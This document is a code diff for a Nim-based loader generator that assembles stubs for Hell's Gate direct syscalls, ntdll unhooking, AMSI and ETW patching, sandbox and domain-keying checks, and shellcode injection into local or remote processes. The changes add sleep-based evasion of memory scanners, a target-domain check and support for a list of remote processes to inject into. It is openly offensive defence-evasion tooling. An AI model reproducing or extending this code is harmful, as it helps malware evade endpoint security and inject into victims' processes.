@@ -19,7 +19,6 @@ import HellsgateStubs
 import CustomEvasionStubs
 import GetSyscallStubs
 import SandboxStubs
-import GlobalVars
 
 
 from system import io
@@ -103,6 +102,8 @@ var
     filename: string = ""
     outfile: string = "Loader.exe"
     envkey: string = "TARGETDOMAIN"
+    remoteprocesses : seq[string]
+    targetdomain : string = ""
     processname: string = ""
     sandboxcheckfmt: string = ""
     sandboxchecks: seq[string]
@@ -116,6 +117,7 @@ var
     unhook: bool = false
     denim: bool = false
     gosleep: bool = false
+    sleeptime: int = 0
     reflective: bool = false
     hide: bool = false
     noArgs: bool = false
@@ -145,7 +147,9 @@ if args["--output"]:
 if args["--remoteprocess"]:
   let remoteprocessesstring = args["--remoteprocess"]
   processname = fmt"{remoteprocessesstring}"
-  remoteprocesses = processname.split(',') 
+  echo processname
+  remoteprocesses = processname.split(',')
+  echo remoteprocesses
 
 if args["--csharp"]:
   csharp = true
@@ -311,6 +315,24 @@ let Winimleanstub = """
 import winim/lean
 """
 
+let SleepStubSeccond * = fmt"""
+echo obf("[*] Sleeping to avoid in memory scanners")
+echo {sleeptime}
+HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
+"""
+
+let DomainCheckStub1 * = fmt"""
+when isMainModule:
+    var localdomain: string = getDomain()
+    if(localdomain != "{targetdomain}"):
+        echo obf("Domain not EQUAL, target / local :") & $localdomain & " / {targetdomain}"
+        quit()
+"""
+
+let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
+    var remoteprocesses: seq[string] = {remoteprocesses}
+"""
+
 let Cryptstub1 = """
 import winim/lean
 #from dynlib import LibHandle, loadLib
@@ -411,21 +433,40 @@ if(sandbox):
             stub.add(MemorySpaceStub)
 
 if(gosleep):
-    stub.add(SleepStub)
+    stub.add(SleepStubFirst)
+    stub.add(SleepStubSeccond)
 
 if(unhook):
-    stub.add(Winimleanstub)
-    stub.add(UnhookStub)
+    if(hellsgate):
+        stub.add(Winimleanstub)
+        stub.add(HellsgateStub)
+        stub.add(HellsgateProtectDelegate)
+        stub.add(HellsgateWriteDelegate)
+        stub.add(HellsgateNtCloseDelegate)
+        stub.add(HellsgateUnhookStub)
+    else:
+        stub.add(Winimleanstub)
+        stub.add(GetSyscallStub)
+        stub.add(NtProtectVirtualMemoryDelegate)
+        stub.add(NtWriteVirtualMemoryDelegate)
+        stub.add(NtCloseDelegate)
+        stub.add(NtProtectSyscallStart)
+        stub.add(UnhookSyscalls)
+        stub.add(UnhookStub)
 
 # Only decrypt when sandbox Checks/nhooking/Sleep is done
 stub = stub & Cryptstub2 & Cryptstub3
 
-if (hellsgate):
+if (hellsgate):  
     stub.add(WinLeanGetCurrentProcStub)
-    stub.add(HellsgateStub)
-    stub.add(HellsgateWriteDelegate)
+    if ("https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html" in stub) == false:
+        stub.add(HellsgateStub)
+    if ("NtWriteVirtualMemory(P" in stub) == false:
+        stub.add(HellsgateWriteDelegate)
     if (AMSI):
-        stub = stub & HellsgateProtectDelegate &  HellsgateAMSIPatchStub
+        if ("NtProtectVirtualMemory(" in stub) == false:
+            stub.add(HellsgateProtectDelegate)
+        stub = stub &  HellsgateAMSIPatchStub
         if(ETW):
             if (COMVARETW):
                 stub = stub & ETWCOMVARStub
@@ -436,16 +477,20 @@ if (hellsgate):
             if (COMVARETW):
                 stub = stub & ETWCOMVARStub
             else:
-                stub = stub & HellsgateProtectDelegate & HellsgateETWPatchStub
+                if ("NtProtectVirtualMemory(" in stub) == false:
+                    stub.add(HellsgateProtectDelegate)
+                stub = stub & HellsgateETWPatchStub
     if(localinject and (csharp == false)):
-        stub = stub & HellsgateAllocDelegate & HellsgateLocalInjectStub
+        if ("NtAllocateVirtualMemory(" in stub) == false:
+            stub.add(HellsgateAllocDelegate)
+        stub = stub & HellsgateLocalInjectStub
     if ((localinject == false) and (csharp == false)):
         # ToDo - not ready yet
         stub.add(RemoteProcImportStub)
         if (processname == ""):
             stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
         else:
-            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customproc & ShellcoderemoteinjectStub
+            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & ShellcoderemoteinjectStub_customprocthird & ShellcoderemoteinjectStub
     if (csharp):
         stub.add(AssemblyImports)
         echo "adding Stub:"
@@ -457,7 +502,8 @@ if (hellsgate):
             stub.add(LoadAssemblyStubArgs)
         csharp = false
 if (peload):
-    stub.add(GetSyscallStub)
+    if ("PS_ATTR_UNION" in stub) == false:
+        stub.add(GetSyscallStub)
     if (AMSI):
         stub = stub &  AMSIETWDelegates & AMSIStub
         if(ETW):
@@ -475,7 +521,8 @@ if (peload):
     stub.add(PELoadStub)
     shellcode = false
 if (shellcode):
-    stub.add(GetSyscallStub)
+    if ("PS_ATTR_UNION" in stub) == false:
+        stub.add(GetSyscallStub)
     if (AMSI):
         stub = stub &  AMSIETWDelegates & AMSIStub
         if(ETW):
@@ -496,12 +543,13 @@ if (shellcode):
         if (processname == ""):
             stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
         else:
-            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customproc & ShellcoderemoteinjectStub
+            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & ShellcoderemoteinjectStub_customprocthird & ShellcoderemoteinjectStub
 
 if (csharp):
     stub.add(AssemblyImports)
     if (AMSI):
-        stub.add(GetSyscallStub)
+        if ("PS_ATTR_UNION" in stub) == false:
+            stub.add(GetSyscallStub)
         stub.add(AMSIETWDelegates)
         stub.add(AMSIStub)
         if(ETW):
@@ -514,7 +562,8 @@ if (csharp):
             if (COMVARETW):
                 stub.add(ETWCOMVARStub)
             else:
-                stub.add(GetSyscallStub)
+                if ("PS_ATTR_UNION" in stub) == false:
+                    stub.add(GetSyscallStub)
                 stub.add(AMSIETWDelegates)
                 stub.add(ETWPatchStub)
     echo "adding Stub:"
